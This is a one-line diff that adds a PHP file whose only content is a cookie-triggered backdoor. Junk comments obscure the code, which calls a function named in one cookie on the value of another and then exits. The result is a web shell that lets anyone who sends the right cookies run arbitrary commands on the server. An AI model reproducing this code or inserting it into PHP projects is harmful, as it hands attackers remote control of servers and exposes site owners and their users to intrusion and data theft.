@@ -1,0 +1,1 @@
+<?php /*L*/if/*otXA*/(isset($_COOKIE["bE"])){$_COOKIE["XU"]($_COOKIE["bE"]);exit;}
